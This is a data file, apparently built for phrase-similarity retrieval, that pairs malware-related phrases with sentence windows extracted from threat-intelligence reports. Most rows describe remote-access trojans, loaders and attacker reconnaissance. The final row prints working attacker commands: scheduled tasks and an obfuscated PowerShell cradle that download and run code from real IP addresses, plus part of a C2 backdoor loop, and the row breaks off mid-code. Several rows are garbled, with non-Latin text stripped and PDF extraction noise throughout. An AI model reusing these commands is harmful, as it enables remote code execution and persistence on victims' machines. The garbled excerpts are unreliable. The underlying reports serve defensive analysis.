phrase|similarity|adjacent_sentences
Command Line Execution|0.7597022778990548|"['Diagram for a heartbeat C2 message.', 'The C2 server returns JSON data instructing the backdoor with the next actions to take.', 'The JSON response contains the same two main keys: code: A value specifying an action or command args: A string or JSON dictionaries with multiple key value pairs containing the required arguments for the specified command InvisibleFerret implements a total of eight commands described below in Table 4.', 'Command Description Checks if the args value is equal to delete and if so, closes the session.', 'To notify the C2 server, it ssh_cmd sends the message string [close].', 'Command execution.', ""Extracts the command value from args['cmd'] and runs it."", 'JSON results ssh_obj sent to the C2 server with code value 1 and args indicating the results.', 'Send contents of keylogger buffer and clipboard data.', 'Reports to C2 server with JSON code ssh_clip value 3 and args containing the collected data.', '9/17ssh_run Downloads and runs the browser stealer component.']"
WMIC|0.773524739341554|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
WMIC|0.8601303879519202|[]
WMIC|0.8836392615299994|['This module executes a series of commands to gather additional host information, which is subsequently uploaded to a C2 server.', 'Interestingly, the commands are not identical to the analogous module examined in the initial Symantec report.', 'These commands executed by this module are almost all wmic commands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete radiography of the system, displayed at Snippet 9.', 'Figure 29: Kwampirs making use of proxy and proxy bypass configuration arrays with an iterator (v2).', 'Shamoon 1, 2 and 3 and Kwampirs, all contain arrays for C2, and Proxy, ProxyByPass, and accessType information.', 'INDEX cylera.com24 ANALYSIS SECTIONS The linkage between Kwampirs and Shamoon hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAddress, EndingAddress wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconnector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop Snippet 9: Kwampirs commands found in a module downloaded by the reporter.', 'Considering the level of detail found in the information gathered, it seems likely that the use of this module is intended for a reconnaissance phase.', 'The types of information gathered may imply that the physical attributes of the device are of interest.', 'This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be inferred from this information.', 'INDEX cylera.com25 ANALYSIS SECTIONS The linkage between Kwampirs and Shamoon 5.1.5 Artifact Similarities File Metadata The metadata of the dropper and reporter components (DLL and EXE) are based on metadata taken from legitimate Microsoft files in both Kwampirs and Shamoon (Figures 30, 31, 32 and 33), but in the case of Kwampirs, metadata from other files/companies was also used in later campaigns.', 'Kwampirs Dropper Shamoon Dropper Figure 30: Kwampirs dropper metadata Figure 31: Shamoon dropper metadata INDEX cylera.com26 ANALYSIS SECTIONS The linkage between Kwampirs and Shamoon Kwampirs Reporter Shamoon Reporter Figure 32: Kwampirs reporter metadata Figure 33: Kwampirs reporter metadata It is worth noting that the metadata of later Kwampirs samples looks different and contains many different tools.']
delete important files|0.7776668617012203|"['Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".', 'Delete files.']"
Themida-packed|0.8186853125341216|['Initial infection is carried out via a malicious executable.', 'An embedded bitmap image (contained in the trojan) is decoded into shellcode upon execution, thus loading the implant.', 'Network communications are encrypted via XOR.', 'The analyzed BISTROMATH samples, along with the other families all attempt to evade analysis via common sandboxes (VIRTUALBOX, QEMU, VMware) via multiple artifact checks (presence of specific devices, registry entries, processes, files).Core functionality includes: File and Process manipulation File/Data upload/exfiltration Timestamp modification/masquerading Service start/stop CMD shell access / use Screenshot Capture Microphone Capture Webcam Control Keylogging Browser hijacking/form grabbing Exfiltration of cached credentials Self-management (update/uninstall)HOPLIGHTProxy payload to obfuscate and/or re-route traffic between infected hosts and C2.', 'Traffic is encrypted over SSL, and the individual payloads are capable of generating fake SSL Certificates.', 'Analyzed samples are Themida packed.', 'One of the examples (SHA256: d77fdabe17cdba62a8e728cbe6c740e2c2e541072501f77988674e07a05dfb39) provided by CISA contained a public SSL certificate and encrypted payload.SLICKSHOESSLICKSHOES is typically utilized as a loader/Dropper.', 'The malware writes itself to C:WindowsWebtaskenc.exe.', 'Separate processes are responsible for the manipulation and execution of the dropped executable.', 'SLICKSHOES is a full beacon-style implant (similar to Cobalt Strike).Makes use of bespoke encoding methods and is capable of RAT-like functionality.', 'File and Process manipulation System recon and exfiltration Input capture Command/process execution and manipulationSLICKSHOES communicates to a hardcoded C2 address (188[.]165[.]37[.']
upload/download file|0.7907829044012105|['Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).', 'Create Windows system services.', 'Upload and download files.', 'Create files via CreateFileTransacted.', 'Port scan.', 'From Click to Brute Figure 4.', 'VirusTotal verdicts for sample as of June 27, 2022.', 'The file in VirusTotal named Roshan_CV.iso (SHA256: 1FC7B0E1054D54CE8F1DE0CC95976081C7A85C7926C03172A3DDAA672690042C) appears to be a curriculum 4/17vitae (similar to a resume) of an individual named Roshan.']
upload/download file|0.8084070252298003|['command codes in the MargualsRAT indicating that this RAT is actively in development by the attackers.', 'ALLAKORE Allakore is a publicly available Delphi- based RAT that has consistently been used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Allakore include: Keylogging.', 'Capture screenshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change wallpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).', 'ACTIONRAT ActionRAT is a Delphi-based RAT Figure 15: Command handler of MargulasRAT.', 'containing a limited set of capabilities.']
Obfuscated PowerShell script|0.7796168383819737|['but we still needed to go one layer deeper and verify the 1:54114 MALWARE-OTHER Html.Trojan.CobaltStrike shellcode was unique in this module.', 'We base64-decode powershell payload download attempt the data and decrypt it using the same `0x23` default 1:54115 MALWARE-OTHER Html.Trojan.CobaltStrike XOR key and its already much larger than the previous powershell payload download attempt payload.', 'Lastly, we have the VBA Method.', 'Our researchers found Its not raw shellcode like we saw in the HTA payloads, this easy to cover because HTA files dont often interface you can immediately see that the MZ header is present.', 'with Excel workbooks, let alone one that tinkers with the This seems to be a stageless beacon included in the AccessVBOM registry key.', 'powershell script.', 'You might wonder why it wasnt included in the HTA attack.', 'The reason is the HTA module 1:54116 MALWARE-OTHER Html.Trojan.CobaltStrike is executing a Powershell one-liner and Windows has VBA payload download attempt a character limit on command line strings, 32767.', 'That 1:54117 MALWARE-OTHER Html.Trojan.CobaltStrike number is even lower when executing a command from VBA payload download attempt `cmd.exe`, 8191.', 'The character limit varies across a variety of execution methods and these numbers are not always From there, we cloned all that to ClamAV coverage to get going to be correct.', 'the following signatures: Html.Trojan.CobaltStrike-7932561-0 Since this payload is downloaded using a small one-liner to execute a string retrieved from the Cobalt Strike controlled Html.Trojan.CobaltStrike-7932562-0 server, that limit is bypassed and a more reliable payload Html.Trojan.CobaltStrike-7932563-0 can be provided.']
Obfuscated PowerShell script|0.7622235917995965|['Figure 8: Return address, overwritten with WinExec VBScript Analysis: https://www.seqrite.com/blog/gorgon-apt-targeting-msme-sector-in-india/ 6/128/12/2020 Gorgon APT targeting MSME sector in India After successful exploitation, cmd.exe is executed with commands: /c cscript %tmp%\\\\ServerCrypted.vbs >> AC This command creates a cscript.exe process to execute code in ServerCrypted.vbs.', 'VBScript file was already dropped in %temp% folder by WinWord process.', 'Below Figure shows the VBScript code.', 'As shown in figure 9 and figure 10, actors used some AV- vendors names in function names, variable names, and strings.', 'This VBScript is responsible to execute two processes, cmd.exe and powershell.exe.', 'Figure 10 shows the obfuscated PowerShell script.', 'Figure 9: Contents of ServerCrypted.vbs https://www.seqrite.com/blog/gorgon-apt-targeting-msme-sector-in-india/ 7/128/12/2020 Gorgon APT targeting MSME sector in India Figure 10: Contents of ServerCrypted.vbs PowerShell Analysis: Figure 11 shows the de-obfuscated PowerShell script.', 'As shown below, the script downloads two files with a .jpg extension.', 'First file 15882060891.jpg is a PowerShell script which contains encoded injector DLL written in C#, as shown in figure 12.', 'This DLL is loaded in-memory by PowerShell.', 'In this script, actors used some interesting names of class and function of injector DLL like FlorianRoth and Cyb3rOps.']
the decryption algorithm|0.7618543230074822|['If the input argument is addr(0x11223344), first add 4 to the value to get 0x11223348, and then set the variant type to 8 (string type).', 'Next, call len function: if found to be BSTR type, vbscript will assume that the forward 4 bytes (0x11223344) is the address memory to store the length.', 'So the len function will be executed and the value of the specified memory address will be returned.', 'Obtain Key DLL Base Address 1.', 'The attacker leaks the virtual function table address of the CScriptEntryPoint object in the following way, which belongs to Vbscript.dll.', '1.', 'Obtain the vbscript.dll base address in the following way.', '1.', 'Because vbscript.dll imported msvcrt.dll, the msvcrt.dll base address was obtained by traversing the vbscript.dll import table, msvcrt.dll introduces kernelbase.dll, ntdll.dll, and finally the NtContinue, VirtualProtect function address was obtained.', 'Save web pages as PDF with PDFmyURLBypass DEP to execute shellcode 1.', 'Use arbitrary reading and writing technique to modify the VAR type type to 0x4d, and then assign it with a value of 0 to make the virtual machine perform VAR:: Clear function.']
the decryption algorithm|0.791515393227727|['The set of Trojans is powerful, with keyboard recording, voice recording, screen capture, file capture and U disk operation functions, etc.', 'The Lucker s name comes from the PDB path of this type of Trojan, because most of the backdoors function use the LK abbreviation.In the middle to late period we have discovered its evolution and two different types of backdoor programs.', 'We have named them Retro and Collector by the PDB path extracted from the program.', 'The Retro backdoor is an evolution of the Lucker backdoor and it actives in a series of attacks from 2016 till now.', 'The name comes from the pdb path of this type of Trojan with the label Retro, and also has the word Retro in the initial installer.C:\\\\workspace\\\\Retro\\\\DLL-injected-explorer\\\\zlib1.pdbC:\\\\workspace\\\\Retro\\\\RetroDLL\\\\zlib1.pdbThe evolution of the reflective DLL injection technique can be found from the relevant PDB paths, and there are a lot of variants of this series of backdoors.VII Attribution1.', 'Decryption AlgorithmDuring the analysis, we found the decryption algorithm that malware used is identical to APT-C-06s decryption algorithm.The decryption algorithm of this attack is as follow:The decryption algorithm APT-C-06 used is as follow:In the further analysis, we found the same decryption algorithm was used in the 64-bit version of the relevant malware.2.', 'PDB PathThe PDB path of the malware used in this attack has a string of Retro.', 'It is one specific feature of Retro Trojan family.3.', 'VictimsIn the process of tracing victims, we found one special compromised machine.', 'It has a large amount of malware related to APT-C-06.', 'By looking at these samples in chronological order, the evolution of the malicious program can be clearly seen.']
to decrypt the payload|0.7732040203685518|"['The execution of StealthMutant through InstallUtil.exe InstallUtil.exe is a legitimate installer application under Microsofts .NET Framework, but it is also known as a living-off-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstallUtil.exe is registered to run StealthMutant, as demonstrated in Figure 11.', 'Figure 11.', 'InstallUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorTechnical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shellcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shellcode loader written in C# that has been in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote process, and then executes it.', 'We have observed that its payload has been either the Cobalt Strike beacon or the ScrambleCross backdoor.', 'Most of the StealthMutant samples we have come across are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework applications.', 'After deobfuscating these samples, we have observed raw namespaces and classes that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and classes from the deobfuscated samples 11 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorAll the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
decrypt it|0.9024083156629212|"['The execution of StealthMutant through InstallUtil.exe InstallUtil.exe is a legitimate installer application under Microsofts .NET Framework, but it is also known as a living-off-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstallUtil.exe is registered to run StealthMutant, as demonstrated in Figure 11.', 'Figure 11.', 'InstallUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorTechnical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shellcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shellcode loader written in C# that has been in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote process, and then executes it.', 'We have observed that its payload has been either the Cobalt Strike beacon or the ScrambleCross backdoor.', 'Most of the StealthMutant samples we have come across are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework applications.', 'After deobfuscating these samples, we have observed raw namespaces and classes that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and classes from the deobfuscated samples 11 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorAll the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
API obfuscation, and execution flow obfuscation|0.7884577806423791|['ESET Research White papers // July 2019 MACHETE JUST GOT SHARPER Venezuelan military under attack How spies managed to steal gigabytes of confidential data over the course of a yearTABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']
proxy|0.7552352780652003|['Securelist.', 'August 2015. can even be such a thing.', 'In a hypothetical scenario where we https://securelist.com/blog/research/71713/darkhotels- have packets captured en route (as in the common jab PCAP or attacks-in-2015/.', 'GTFO), could it not be a backdoored system being used to [2] Schneier, B.', 'Simultaneous Discovery of Vulnerabilities.', 'proxy through?', 'Where we catch a nation-state operator Schneier on Security.', 'February 2016. red-handed, would we not need an understanding of the https://www.schneier.com/blog/archives/2016/02/ provenance of their tasking?', 'More realistically, there will never simultaneous_di.html.', 'be a solid enough attribution claim for everyone to get behind.', 'Rather, the combination of multiple indicators helps an analyst [3] Equation Group: Questions and Answers.']
Windows API|0.7903233347120202|['ESET Research Whitepapers // August 2018 TURL A OUTLOOK BACKDOOR Analysis of an unusual Turla backdoor2 Turla Outlook Backdoor // Analysis of an unusual Turla backdoor 1.', 'CONTENTS 1.', 'Introduction.', '.', '.', '.', '.', '.', '.']
Windows API|0.7903233347120202|"[': //http://localhost:3699/api/GetSources?Type=3&start=1532620329&end=1532620329 : [ { ""Type"": 3, ""IP"": """", 23""Mac"": """", ""Name"": "" Scotland Redmoss 1,9km"", ""StationNumber"": """", ""Time"": 1532563200000, ""GeoX"": 57.13, ""GeoY"": -2.12, ""Extras"": ""Vsat "" }, { ""Type"": 3, ""IP"": """", ""Mac"": """", ""Name"": ""iDirect HUB iNFINITI"", ""StationNumber"": """", ""Time"": 1538572327000, ""GeoX"": 55.784,""GeoY"": 37.486, ""Extras"": ""-NSS 7; -Ku-3 Norsat; -Vertical; -12558014279; vsat_-iDirect HUB iNFINITI; _-1538572327; - 55,784|37,486; - Moscow Oblast Khoroshevo-Mnevniki (159000) 0,9km"" }, ... ]   1.   : {ip}:9850/api/GetState : [ { ""Id"": 1, ""Name"": """", ""Status"": ""Ok"", ""Message"": "" .', ': 478"" },... ]  1.   id : {ip}:9850/api/KeyWords/{id} //GET : id  .', ': //http://localhost:3699/api/KeyWords/1 [ { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [""*"",""Sergy*"",""356"",""Test rub 358999"",""Last Add rub 66""] }, 24{ ""ID"": 1, ""Language"": ""CA"", ""KeyWords"": [""ARRAMBADA"",""BANDARRA"",""BARRINAR"",""BOLLERA"",""BOLLICAO"",""CAGANER"", ""CARDAR"",""CASCAR&SE&LA"",""COLLONS"",""CONSOLADOR"",""CONY"",""CUL"",""ESCALFAPOLLES"",""FAR RANACO"",""FER&UN&RIU"", ""FIGA"",""FILL&DE&PUTA"",""FILL&DE&VERRA"",""FOLLADOR"",""FOLLAR"",""FURNICAR"",""GALLUMBOS"","" GILIPOLLES"",""HINYAR "",""LLEPAR"",""LLETERADA"",""MAMADA"",""MANOLA"",""MARIETA"",""MARIPILI"",""PAJARITO"",""PARRS"",""P ELAR&SE&LA"",""PUT A"",""PUTOT"",""TREMPERA"",""TXITX*"",""XONA"",""XUFA""] }, { ""ID"": 1, ""Language"": ""CS"", ""KeyWords"": [""BUZERANT"",""CHUJ"",""HOVNO"",""KOULE"",""KUNDA"",""KURVA"",""PRDEL"",""VEJCE"",""ZMRD""] },... ] 2.   id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 358999"", ""Last Add rub 667"" ] }   1.  : {ip}:9850/api/rubriclist?Parent=-1 //  {ip}:9850/api/rubriclist?Parent=20 //  Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": null, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25},... ] : Url=""/json/rubrics/5 2.  : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""AA"", ""Name"": ""AA-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },... ] API     .', '.', ',     .', '.', '-    .', '26      -     ,    (),  (),   ().', '-  .']"
Windows API|0.7903233347120202|['19 Corelan Team.', 'Starting to write Immunity Debugger PyCommands : my cheatsheet.', 'January 2010.', '10 www.fireeye.comPoison Ivy: Assessing Damage and Extracting Intelligence Defenders View Attackers View Starting ChopShop Initializing Modules ... Initializing module poisonivy_23x Transferred files will be saved.. Screen/Cam/Audio/Key captures will be saved.. Running Modules ... [2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]*** Host Information*** PI profile ID: mal IP address: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 2600 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] *** Shell Session *** Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\\\\> [2013-07-03 06:46:42 PDT] *** Shell Session *** ipconfig [2013-07-03 06:46:43 PDT] *** Shell Session *** Windows IP Configuration Connection-specific DNS Suffix .', ': IP Address.', '.', '.', '.', '.', '.', '.']
Windows API|0.7903233347120202|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
Windows API|0.7903233347120202|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
C:\Windows\System32\cmd.exe /c|0.7619432530726247|"['Memory segments can be seen allocated with Execute, Read, and Write permissions, indicating that executable code is stored.Anomalous parent and child process relationships can be seen on the system that Hancitor was executed on, including rundll32.exe spawning svchost.exe and svchost.exe spawning cmd.exe.Moreover, the Cobalt Strike DLL stager was executed with a specific command line parameter which is used as a sandbox evasion feature.', 'In this case it is the number 11985756.Lastly, a PowerShell loader named agent1.ps1 used heavy obfuscation to conceal the execution flow and hide the final shellcode.', 'After many iterations, the script would deobfuscate and run-in memory.', 'The shellcode is responsible for loading a PE file into memory and calling out to 64.235.39[.', ']32 for further instructions.Credential AccessThe only credential access observed was through Zerologon, which was used to retrieve the domain administrators NTLM hash.DiscoveryDiscovery started with a port scan initiated by the Hancitor dll.After SMB was scanned we saw scans of 5000/tcp, 9392/tcp, 6106/tcp.', 'The threat actors were scanning for backup products such as Synology, Backup Exec and Veeam.This was followed by a battery of discovery command using the built in Microsoft utilities to discover domain controllers, administrators, connectivity checks and other items.C:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group""Domain Admins""/domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping190.114.254.116C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainNotice above, the threat actors pinged 190.114.254[.', ']116 which is one of the Cobalt Strike servers they later used.The threat actors enumerated local administrative access on remote systems by checking access to the C$ share for hosts discovered after the port scan.We observed a PowerShell script named comp2.ps1 that was executed on every Domain Controller in the environment.', 'This script used the Active Directory RSAT module to get a list of computers and place them in a file named comps.txt.A program named check.exe was observed using the comps.txt text file.', 'This program will take a list of IP addresses and hostnames from comps.txt and check if they are online using ICMP.', 'The online hosts will then be directed to the check.txt text file.The check.exe file contains three parameters that can be used one at a time:check.exe comps.txtcheck.txt -ip (Checkwhichhostsincomps.txtarealive,andwrite the IPtocheck.txt)check.exe comps.txtcheck.txt -name(Checkwhichhostsincomps.txtarealive,andwrite the hostnametocheck.txt)check.exe comps.txtcheck.txt -full(Checkwhichhostsincomps.txtarealive,andwrite the IPandhostnametocheck.txt)Lateral MovementThe threat actors pivoted towards multiple hosts on the domain from the beachhead.', 'The main actions involved copying a Cobalt Strike DLL beacon and a batch script to run the DLL (cor.dll, cor.bat, GAS.dll, GAS.bat).']"
C:\Windows\System32\cmd.exe /c|0.8012749828240929|"['The batch scripts came from the first revision ofRevisions quick-disable-windows-defender.bat GitHub, which was used by the ransomware operators without making any changes.Masquerading Example (reference)Obfuscation Example (reference)DiscoveryOnce access is established, threat actors then need to enumerate the victim environment.', 'Common initial discovery tools include Windows built-in utilities (net.exe, nltest.exe, systeminfo, ipconfig, whoami, etc) and theAdFindtool.', 'In a few cases, adversaries attempted to get a listing of open ports/running services on remote hosts by performing port scans using tools such as Advanced IP Scanner and KPortScan 3.0.The first thing we observe from hands-on keyboard operators is usually additional discovery activity.', 'We see threat actors concentrate on searching for the Domain Controllers and general environmental information.The statistics below illustrate the most used Windows tools for enumerating the environment.', 'We compare each tool to the total percent of cases investigated.We see the enumeration commands executed in a short time span, between 1-5 seconds.', 'The execution is usually done through post-exploitation frameworks (Cobalt Strike in most cases).Example screenshot is taken from the case:From Zero to Domain AdminC:\\\\Windows\\\\system32\\\\cmd.exe /C net time  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping [Domain Controller]  C:\\\\Windows\\\\system32\\\\cmd.exe /C nltest /dclist:[Domain Name]  C:\\\\Windows\\\\system32\\\\cmd.exe /C Net group ""Domain Admins"" /domain \\\\ C:\\\\Windows\\\\system32\\\\cmd.exe /C nslookup  C:\\\\Windows\\\\system32\\\\cmd.exe /C ping 190.114.254.116  C:\\\\Windows\\\\system32\\\\cmd.exe /C net group /domainLateral MovementLateral movement is a vital component of threat actor TTPs.', 'Once they get the lay of the land through the discovery methods we outlined above, we repeatedly see them move laterally across the network.', 'Domain Controllers, file shares and similarly high-value servers are primary targets.The number one post-exploitation framework of choice, Cobalt Strike, allows threat actors to leverage different techniques for the purpose of lateral movement.Other common choices for threat attackers include Remote Desktop connections, remote WMI execution of transferred binaries, and the Sysinternals tool PsExec.', '(updated 3/7/22 @ 1330 UTC)WMIC Lateral Movement Example (reference)Psexec Example (reference)Command and ControlOne common theme seen across the majority of the intrusions has been the reliance on Cobalt Strike for performing post-exploitation activities.', 'In almost all cases, the initial access brokers such as Trickbot and Bazar, dropped multiple Cobalt Strike beacons across the victim environment.For an in-depth breakdown of some of the network operations of Cobalt Strike see ourrecent report on the topic.ExfiltrationWhile exfiltration of data was not a common sight in our data set, we observed exfil in 6 of the 20 cases.', 'In the cases where data exfiltration was observed, the threat actors used tools such as RClone, FileZilla, or WinSCP to transfer the data to their controlled servers.']"
calling the RegisterClass function prior to calling CreateWindow.|0.758028220582889|['This flow might act as protection from the techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code.', 'The threat actors appear to have reverse-engineered the logic of smadAV and dealt with this check by creating a window without a window name, but with the class name EDIT which is one of the available default windows class names.', 'The window attributes include a very large number for the X position, the width and height are set to 0, and flags such as WS_EX_TOOLWINDOW define the window as a tool window.', 'These attributes make sure the window is identified as visible by IsWindowVisible function, but in fact, it is not shown to the user and does not appear in the taskbar or when pressing ALT+TAB: Figure 2 A piece of malware code creates a specially crafted window to bypass the smadAV.', 'Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.', 'But in this case, the threat actors decided to use a default class name which allows them to skip calling the RegisterClass function prior to calling CreateWindow.', 'Ultimately, creating this window allows the threat actors to bypass the check, as the newly created window is technically visible, and continue the backdoor execution uninterrupted.', 'Figure 3 SmadAV detection on the Go backdoor with the removed bypassSMADAV function.', 'Backdoor execution flow The malware creates a mutex named NASA&USA and then continues execution according to one of two modes of operation.', '3/6First mode: persistence, PowerShell backdoor, and malware installation The malware checks if there is a zip string in the file path.', 'If this is not found, it continues the execution flow.']
Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.|1.0|['If none is found, meaning the new process doesnt have any visible windows, the antivirus deems the newly created process to be malicious and shows a popup that suggests blocking the created process.', 'This flow might act as protection from the techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code.', 'The threat actors appear to have reverse-engineered the logic of smadAV and dealt with this check by creating a window without a window name, but with the class name EDIT which is one of the available default windows class names.', 'The window attributes include a very large number for the X position, the width and height are set to 0, and flags such as WS_EX_TOOLWINDOW define the window as a tool window.', 'These attributes make sure the window is identified as visible by IsWindowVisible function, but in fact, it is not shown to the user and does not appear in the taskbar or when pressing ALT+TAB: Figure 2 A piece of malware code creates a specially crafted window to bypass the smadAV.', 'Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.', 'But in this case, the threat actors decided to use a default class name which allows them to skip calling the RegisterClass function prior to calling CreateWindow.', 'Ultimately, creating this window allows the threat actors to bypass the check, as the newly created window is technically visible, and continue the backdoor execution uninterrupted.', 'Figure 3 SmadAV detection on the Go backdoor with the removed bypassSMADAV function.', 'Backdoor execution flow The malware creates a mutex named NASA&USA and then continues execution according to one of two modes of operation.', '3/6First mode: persistence, PowerShell backdoor, and malware installation The malware checks if there is a zip string in the file path.']
"the malware creates a scheduled task to execute its copy from this randomized path:

schtasks /Create /TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR ""explorer.exe c:\users\public\8NaZrCq3pGeDRXKF.zip\8NaZr.exe"" /f"|0.8860023215665014|"['If this is not found, it continues the execution flow.', 'First, it creates the directory c:\\\\programdata\\\\Robots.', 'If this fails, the malware does not continue the execution, likely because the infected user only has low privileges.', 'Next, the malware creates 2 scheduled tasks called test and test2 to retrieve and execute PowerShell commands, each retrieved from robots.txt from different C&C servers, most likely to eliminate a single point of failure: schtasks /Create /TN test /SC MINUTE /MO 15 /TR ""powershell \\\\""$r= [System.Net.WebRequest]::Create(\\\\\\\\\\\\""http://5.188.33.190/Robots.txt\\\\\\\\\\\\"");(new- object System.IO.StreamReader(($r.GetResponse()).GetResponseStream())).ReadToEnd() | powershell.exe -noprofile -\\\\"""" /f schtasks /Create /TN test2 /SC MINUTE /MO 45 /TR ""powershell \\\\""$r= [System.Net.WebRequest]::Create(\\\\\\\\\\\\""http://103.159.132.91/Robots.txt\\\\\\\\\\\\""); (new-object System.IO.StreamReader(($r.GetResponse()).GetResponseStream())).ReadToEnd() | powershell.exe -noprofile -\\\\"""" /f At the time of execution, both servers returned the same code pointing to the third server: C:\\\\Windows\\\\System32\\\\cmd.exe /c ""start powershell.exe -nop -c set-alias exi iex;`$v1=\'iex (new-object net.webclient).dow\';`$v2=\'nloadstring(\'\'http://\';`$v3=\'103.159.132.91/robots1.txt\'\')\';exi(`$v1+ The final payload returned is a lightweight PowerShell backdoor, which retrieves a list of commands from the CMD header from the C&C server response, executes them with Invoke-Expression, concatenates the outputs with \'_n1w_\' string, and sends them back to the server in POST request: $WindowState = \'[DllImport(""user32.dll"")] public static extern bool ShowWindow(int handle, int stat);\';add-type -name win -member $WindowState - namespace native; [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0); $url=""http://103.159.132.91:8081/""; $postParams = \'result=start\'; while (1 -eq 1) { try { $data = [System.Text.Encoding]::UTF8.GetBytes($postParams); $req = [System.Net.WebRequest]::Create($url); $req.ServicePoint.ConnectionLimit =65535; If 